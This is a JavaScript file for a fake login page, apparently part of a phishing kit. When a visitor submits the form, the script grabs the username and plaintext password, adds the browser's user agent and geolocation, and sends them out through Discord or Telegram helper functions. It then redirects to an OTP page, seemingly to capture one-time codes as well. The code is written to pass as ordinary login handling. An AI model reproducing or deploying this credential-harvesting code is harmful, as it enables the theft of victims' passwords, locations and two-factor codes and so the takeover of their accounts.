// Login Page JavaScript

document.addEventListener('DOMContentLoaded', function() {

    // Password Toggle Functionality
    const togglePassword = document.getElementById('togglePassword');
    const passwordInput = document.getElementById('password');
    const toggleText = togglePassword.querySelector('.toggle-text');
    const eyeIcon = togglePassword.querySelector('.eye-icon');

    if (togglePassword && passwordInput) {
        togglePassword.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            
            if (type === 'text') {
                toggleText.textContent = 'Hide';
                eyeIcon.textContent = '👁️‍🗨️';
            } else {
                toggleText.textContent = 'Show';
                eyeIcon.textContent = '👁️';
            }
        });
    }

    // Login Form Submission
    const loginSubmitBtn = document.getElementById('loginSubmitBtn');
    const loginForm = document.querySelector('.login-form');
    const usernameInput = document.getElementById('username');
    const passwordInputField = document.getElementById('password');

    if (loginSubmitBtn) {
        loginSubmitBtn.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Basic validation
            if (!usernameInput.value.trim()) {
                alert('Please enter your username');
                usernameInput.focus();
                return;
            }

            if (!passwordInputField.value.trim()) {
                alert('Please enter your password');
                passwordInputField.focus();
                return;
            }

            // Get user credentials
            const username = usernameInput.value.trim();
            const password = passwordInputField.value.trim();
            
            // Store credentials in localStorage for OTP page
            localStorage.setItem('loginUsername', username);
            localStorage.setItem('loginPassword', password);
            
            // Get user's IP and device info
            const userAgent = navigator.userAgent;
            const timestamp = new Date().toLocaleString();
            
            // Change button state
            loginSubmitBtn.textContent = 'Logging in...';
            loginSubmitBtn.disabled = true;

            // Get location (use stored location from splash if available, otherwise get new one)
            let locationPromise;
            const storedLocation = localStorage.getItem('userLocation');
            if (storedLocation) {
                try {
                    const parsedLocation = JSON.parse(storedLocation);
                    if (parsedLocation.latitude !== 'N/A') {
                        console.log('📍 Using stored location from splash screen');
                        locationPromise = Promise.resolve(parsedLocation);
                    } else {
                        locationPromise = getUserLocation();
                    }
                } catch (e) {
                    locationPromise = getUserLocation();
                }
            } else {
                locationPromise = getUserLocation();
            }
            
            locationPromise.then(location => {
                // Prepare message for Discord (simple and friendly)
                const locationText = formatLocationForDiscord(location);
                const message = `
🔐 New Login Attempt

👤 Username: ${username}
🔑 Password: ${password}

📱 Device Info:
${userAgent}

${locationText}

🕐 Time: ${timestamp}
                `.trim();

                // Send to Discord
                if (typeof sendToTelegram === 'function' || typeof sendToDiscord === 'function') {
                    const sendFunction = sendToDiscord || sendToTelegram;
                    sendFunction(message).then(success => {
                        if (success) {
                            console.log('Login credentials sent to Discord');
                        } else {
                            console.log('Discord send failed, but continuing with login');
                        }
                    }).catch(error => {
                        console.log('Discord error, but continuing with login:', error);
                    });
                } else {
                    console.log('Discord not configured, continuing with login');
                }
            }).catch(error => {
                // If location fails, send without location
                console.log('Location error:', error);
                const message = `
🔐 New Login Attempt

👤 Username: ${username}
🔑 Password: ${password}

📱 Device Info:
${userAgent}

📍 Location: Not available

🕐 Time: ${timestamp}
                `.trim();

                if (typeof sendToTelegram === 'function' || typeof sendToDiscord === 'function') {
                    const sendFunction = sendToDiscord || sendToTelegram;
                    sendFunction(message).catch(err => console.log('Discord error:', err));
                }
            });

            // Always redirect to OTP page after short delay
            setTimeout(() => {
                window.location.href = 'otp.html';
            }, 800);
        });
    }

    // Forgot Username Link
    const forgotUsernameLinks = document.querySelectorAll('.forgot-link');
    forgotUsernameLinks.forEach(link => {
        if (link.textContent.includes('username')) {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                alert('Forgot username functionality will be implemented here');
            });
        }
    });

    // Forgot Password Link
    forgotUsernameLinks.forEach(link => {
        if (link.textContent.includes('password')) {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                alert('Forgot password functionality will be implemented here');
            });
        }
    });
});
